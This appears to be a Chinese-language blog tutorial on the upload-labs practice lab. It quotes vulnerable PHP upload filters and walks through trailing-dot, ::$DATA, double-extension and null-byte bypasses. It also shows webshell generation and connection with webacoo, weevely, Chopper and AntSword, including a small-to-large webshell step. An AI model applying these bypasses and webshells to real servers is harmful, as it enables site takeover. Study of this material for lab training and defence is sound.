<h4 id="WebShell生成与上传"><a href="#WebShell生成与上传" class="headerlink" title="WebShell生成与上传"></a>WebShell生成与上传</h4><p>-g 表示生成</p>
<p>-o 输出到webshell.php</p>
<p>可以使用webacoo生成webshell：webacoo -g -o webshell.php</p>
<p>BurpSuite截断HTTP请求 ，修改对应的文件名，添加空格</p>
<p>-t 表示使用终端，链接之后反弹回来的可以执行cmd的终端</p>
<p>-u 表示URL</p>
<p>使用Webacoo连个上传成功地webshell：webacoo -t -u “URL”</p>
<h5 id="使用webacoo生成一个webshell"><a href="#使用webacoo生成一个webshell" class="headerlink" title="使用webacoo生成一个webshell"></a>使用webacoo生成一个webshell</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160104577.png" alt="image-20200407160104577"></p>
<p>页面上传并拦截，在文件或加空格绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160149272.png" alt="image-20200407160149272"></p>
<h5 id="复制图片连接打开新的页面，将地址复制，查看。页面返回空白"><a href="#复制图片连接打开新的页面，将地址复制，查看。页面返回空白" class="headerlink" title="复制图片连接打开新的页面，将地址复制，查看。页面返回空白"></a>复制图片连接打开新的页面，将地址复制，查看。页面返回空白</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160258571.png" alt="image-20200407160258571"></p>
<h5 id="win-r打开cmd，查看当前ip，然后将图片地址复制，将其中的127-0-0-1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确"><a href="#win-r打开cmd，查看当前ip，然后将图片地址复制，将其中的127-0-0-1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确" class="headerlink" title="win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确"></a>win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160419396.png" alt="image-20200407160419396"></p>
<p>可以使用cmd命令</p>
<p>netstat -an命令式查看所有和本地计算机建立连接的IP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160448463.png" alt="image-20200407160448463"></p>
<h4 id="绕过黑名单验证-号绕过"><a href="#绕过黑名单验证-号绕过" class="headerlink" title="绕过黑名单验证(.号绕过)"></a>绕过黑名单验证(.号绕过)</h4><p>upload-labs第七关</p>
<h5 id="号绕过原理"><a href="#号绕过原理" class="headerlink" title=".号绕过原理"></a>.号绕过原理</h5><p>Windows系统下，文件后缀名最后一个点会被自动去除</p>
<p>例如：在桌面新建一个1.php. 系统会自动删除最后一个点</p>
<h5 id="基于黑名单验证代码分析-2"><a href="#基于黑名单验证代码分析-2" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        &#x2F;&#x2F; 加入去空格处理，不能使用空格绕过</span><br><span class="line">        &#x2F;&#x2F; 但是没有删除deldot这个.号，这样就可以利用Windows特性进行.号绕过</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        &#x2F;&#x2F; 进行了大小写转换，也不能进行大小写绕过</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BurpSuite绕过黑名单验证-2"><a href="#BurpSuite绕过黑名单验证-2" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>上传php文件，使用burp抓包，在文件后加上.号，放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161029364.png" alt="image-20200407161029364"></p>
<p>返回空白文档，复制图片地址，在新页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161059182.png" alt="image-20200407161059182"></p>
<h4 id="生成并上传webshell"><a href="#生成并上传webshell" class="headerlink" title="生成并上传webshell"></a>生成并上传webshell</h4><h5 id="1、生成：weevely-generate-密码-路径-文件名"><a href="#1、生成：weevely-generate-密码-路径-文件名" class="headerlink" title="1、生成：weevely generate 密码 路径 文件名"></a>1、生成：weevely generate 密码 路径 文件名</h5><p>使用weevely生成webshell</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161239452.png" alt="image-20200407161239452"></p>
<h5 id="2、上传"><a href="#2、上传" class="headerlink" title="2、上传"></a>2、上传</h5><p>上传使用burp抓包加.放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161329461.png" alt="image-20200407161329461"></p>
<p>复制图片地址，在新的页面运行</p>
<h5 id="3、连接：weevely-shell文件地址-密码"><a href="#3、连接：weevely-shell文件地址-密码" class="headerlink" title="3、连接：weevely shell文件地址 密码"></a>3、连接：weevely shell文件地址 密码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161536416.png" alt="image-20200407161536416"></p>
<p>可以使用help查看一下帮助信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161559965.png" alt="image-20200407161559965"></p>
<p>查看其中的一个net_scan端口扫描</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161644586.png" alt="image-20200407161644586"></p>
<p>使用system_info</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407161737393.png" alt="image-20200407161737393"></p>
<h4 id="绕过黑名单验证-特殊符号"><a href="#绕过黑名单验证-特殊符号" class="headerlink" title="绕过黑名单验证(特殊符号)"></a>绕过黑名单验证(特殊符号)</h4><p>upload-labs第八关</p>
<h5 id="1、特殊符号绕过原理"><a href="#1、特殊符号绕过原理" class="headerlink" title="1、特殊符号绕过原理"></a>1、特殊符号绕过原理</h5><p>Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析</p>
<p>例如：在windows系统下新建一个文件名为1.php::$DATA的文件，查看效果。但是在Window下新建的文件名中，包含特殊符号不能成功新建</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585798158128.png" alt="image-20200405083527548"></p>
<p>因为在Windows下不能建带有特殊符号的文本，所以在kali中新建</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405082756442.png" alt="1585798158128"></p>
<h5 id="2、基于黑名单验证代码分析"><a href="#2、基于黑名单验证代码分析" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 去空格，去末尾的点，转换大小写，首尾去空</span><br><span class="line">        &#x2F;&#x2F; 并没有黑名单过滤::这个符号和$DATA这个变量(::$DATA)</span><br><span class="line">        &#x2F;&#x2F; $DATA这个变量是ADS NTFS系统，所具有的一种格式，数据流</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果在Windows下使用1.php::$DATA系统会直接修改为,1.php，去掉::$DATA，因为Windows不支持文件有特殊符号，通过这种方式就可以绕过黑名单检测，以后在检测黑名单时一定要将这个内容去除掉，否则黑名单很容易被绕过。。。当然过滤时不推荐使用黑名单，推荐白名单，毕竟黑名单出现的漏洞太多。</p>
<h5 id="3、直接上传1-php-DATA"><a href="#3、直接上传1-php-DATA" class="headerlink" title="3、直接上传1.php::$DATA"></a>3、直接上传1.php::$DATA</h5><p>上传带有特殊符号的php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083527548.png" alt="image-20200405083301173"></p>
<p>页面返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083545100.png" alt="image-20200405083719450"></p>
<p>复制当前图片连接，使用菜刀或者蚁剑连接php脚本，将::$DATA特殊符号删除，进行连接，aaa是当时webshell中设置的密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083719450.png" alt="image-20200405083545100"></p>
<p>成功连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083944908.png" alt="image-20200405083944908"></p>
<h4 id="绕过黑名单验证-路径拼接绕过"><a href="#绕过黑名单验证-路径拼接绕过" class="headerlink" title="绕过黑名单验证(路径拼接绕过)"></a>绕过黑名单验证(路径拼接绕过)</h4><h5 id="1、路径拼接绕过原理"><a href="#1、路径拼接绕过原理" class="headerlink" title="1、路径拼接绕过原理"></a>1、路径拼接绕过原理</h5><p>在没有对上传的文件进行重命名的请胯下，用户可以自定义文件名并在服务器上传新建，就会造成对应的绕过黑名单</p>
<p>例如：</p>
<p>用户新建    1.php.+空格+.</p>
<p>deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.。</p>
<p>利用windows特性自动去除最后一个点，导致上传成功</p>
<p>所谓路径拼接，就是文件名直接拼接到上传的路径当中</p>
<h5 id="2、基于黑名单验证码代码分析"><a href="#2、基于黑名单验证码代码分析" class="headerlink" title="2、基于黑名单验证码代码分析"></a>2、基于黑名单验证码代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">            &#x2F;&#x2F; 我们上传的文件没有进行随机化重命名，而是直接将对应文件名拼接到最终的路径下进行上传</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3、修改文件名-绕过黑名单验证"><a href="#3、修改文件名-绕过黑名单验证" class="headerlink" title="3、修改文件名 绕过黑名单验证"></a>3、修改文件名 绕过黑名单验证</h5><p>因为Windows特性不能再Windows下修改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">file.php. .</span><br></pre></td></tr></table></figure>

<p>需要在kali中修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101158548.png" alt="image-20200405101235839"></p>
<p>上传拼接文件，返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101235839.png" alt="image-20200405101158548"></p>
<p>选择图片的图片地址，在新的页面打开，因为我上传的php代码里面是phpinfo所以会返回phpinfo的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101354885.png" alt="image-20200405101432318"></p>
<p>在查看upload下是否有file.php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101432318.png" alt="image-20200405101354885"></p>
<p>这样的一个绕过，只适用于Windows系统，并且当前的文件名没有被重命名，而是直接使用用户上传的文件名，这时候用户文件名是一个可控状态</p>
<h5 id="4、上传小WebShell-小马-，大WebShell-大马"><a href="#4、上传小WebShell-小马-，大WebShell-大马" class="headerlink" title="4、上传小WebShell(小马)，大WebShell(大马)"></a>4、上传小WebShell(小马)，大WebShell(大马)</h5><p>上传WebShell，可以绕过上传过程中对文件大小等限制，从而能够更加有效上传大WebShell</p>
<p>在某些情况下，会对文件上传的大小做一些限制，为了突破这个限制，先上传小WebShell(小马)，也就是它本身就是一个可以上传WebShell的上传界面，而它的上传界面当中对应的代码对比相对的大WebShell(大马)，小很多。</p>
<p>通过缩减对应的字节数，从而达到符合对应的上传的限制，然后进行上传小WebShell，上传之后小WebShell是没有做限制的，这个时候就可以利用小WebShell上传更大的WebShell，从而突破文件上传工程中对文件大小的限制，以及其他限制</p>
<p>这是小马，代码量比较少</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405102809065.png" alt="image-20200405102809065"></p>
<p>进行上传，返回空白图片，右键复制网页地址，在新的页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405103811317.png" alt="image-20200405103912957"></p>
<p>打开网页地址，成功上传了小马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405103912957.png" alt="image-20200405104442201"></p>
<p>在进行上传大马，打开大马，复制其中内容Ctrl+A进行全部选取，Ctrl+C复制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405104442201.png" alt="image-20200405103811317"></p>
<p>复制到小马的上传文本框中，将之前的xiaoma.php改名为dama.php(起什么名字无所谓，只要不适合xiaomaphp相同就行)，点击create</p>
<p>注意：因为如果不改名的话就会将大马的内容上传到之前小马的php文件中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105229631.png" alt="image-20200405105229631"></p>
<p>返回ok表示上传成功，这样就说明大马成功上传了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105415021.png" alt="image-20200405192815485"></p>
<p>查看站点根目录，这样就有了dama.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105448859.png" alt="image-20200405105448859"></p>
<p>访问大马出现报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405112056011.png" alt="image-20200405192902724"></p>
<p>因为之前小马中使用了utf-8的原因，我们将小马的编码删除，在按照以上的方式来上传一遍</p>
<h4 id="绕过黑名单验证-双写绕过"><a href="#绕过黑名单验证-双写绕过" class="headerlink" title="绕过黑名单验证(双写绕过)"></a>绕过黑名单验证(双写绕过)</h4><p>upload-labs第十关</p>
<h5 id="1、双写绕过原理"><a href="#1、双写绕过原理" class="headerlink" title="1、双写绕过原理"></a>1、双写绕过原理</h5><p>代码编写过程中，支队黑名单中的内容进行空替换，因为只替换一次所造成的双写绕过</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.ph   php  p</span><br><span class="line">进行对应的空替换时，会首先发现php，将其过滤，过滤之后因为中间的php没有了，后面的p补上来，又变成了一个php文件，从而达到绕过。</span><br></pre></td></tr></table></figure>

<h5 id="2、基于黑名单验证代码分析-1"><a href="#2、基于黑名单验证代码分析-1" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h5><p>str_ireplace()函数替换字符串中的一些字符(不区分大小写)。</p>
<p>该函数必须遵循下列规则</p>
<ul>
<li>如果搜索的字符串是一个数组，那它将返回一个数组</li>
<li>如果搜索的字符串是一个数组，那么它将对数组中的每一个元素进行查找和替换</li>
<li>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查询到的元素数量，那么多余的元素将用空字符进行替换</li>
<li>如果是对一个数组进行查找，但只是对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li>
<li>注释：该函数不区分大小写。请使用str_replace()函数来执行区分大小写的搜索。</li>
<li>注释：该函数是二进制安全的</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        &#x2F;&#x2F; 这里使用str_ireplace()函数，这个函数的意思是，只替换一次，并且为空。</span><br><span class="line">        &#x2F;&#x2F; 将$file_name中符合$deny_ext黑名单中的后缀名替换为空</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3、绕过黑名单验证"><a href="#3、绕过黑名单验证" class="headerlink" title="3、绕过黑名单验证"></a>3、绕过黑名单验证</h5><p>将文件进行双写,例如：one.pphphp</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405192815485.png" alt="image-20200405193016113"></p>
<p>选择文件进行上传，发现返回空白图片，复制图片地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405192902724.png" alt="image-20200405112056011"></p>
<p>将复制的图像地址在菜刀或者蚁剑打开，成功上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405193016113.png" alt="image-20200405105415021"></p>
<h4 id="绕过白名单验证-00截断绕过"><a href="#绕过白名单验证-00截断绕过" class="headerlink" title="绕过白名单验证(00截断绕过)"></a>绕过白名单验证(00截断绕过)</h4><h5 id="1、00截断原理"><a href="#1、00截断原理" class="headerlink" title="1、00截断原理"></a>1、00截断原理</h5><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符</p>
<p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束</p>
<p>在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数</p>
<p>白名单验证就是指定的文件后缀名，比如只允许jpg、png等文件上传，进行文件上传时，只有后缀名符合这两个后缀名才允许上传，这就是白名单</p>
<h5 id="00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。"><a href="#00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。" class="headerlink" title="%00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。"></a>%00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。</h5><p>而白名单在进行验证时可以直接在后面输入00</p>
<p>比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">再上传过程中它是一个jpg文件，但是在.php后面有0x00截断，.jpg忽略，这样就成功上传了1.php</span><br><span class="line">1.php0x00.jpg</span><br><span class="line">00后面的内容都将被忽略，但是在整个过程中，他的文件名还是依然存在</span><br></pre></td></tr></table></figure>

<h5 id="2、GET型00截断"><a href="#2、GET型00截断" class="headerlink" title="2、GET型00截断"></a>2、GET型00截断</h5><p>GET型提交的内容会被自动进行URL解码。</p>
<p><strong>注意：</strong>进行00截断一定要关闭<strong>GPC</strong>，否则无法成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">      &#x2F;&#x2F; date()随机数和rand()时间，以及最后添加文件扩展名$file_ext</span><br><span class="line">      &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">	&#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先新建一个1.php的文件，将其里面写入一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406081237206.png" alt="image-20200406083446465"></p>
<p>写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083134693.png" alt="image-20200406081237206"></p>
<p>进行上传，使用burp抓包，然后将burp中的信息进行稍微修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083446465.png" alt="image-20200406083134693"></p>
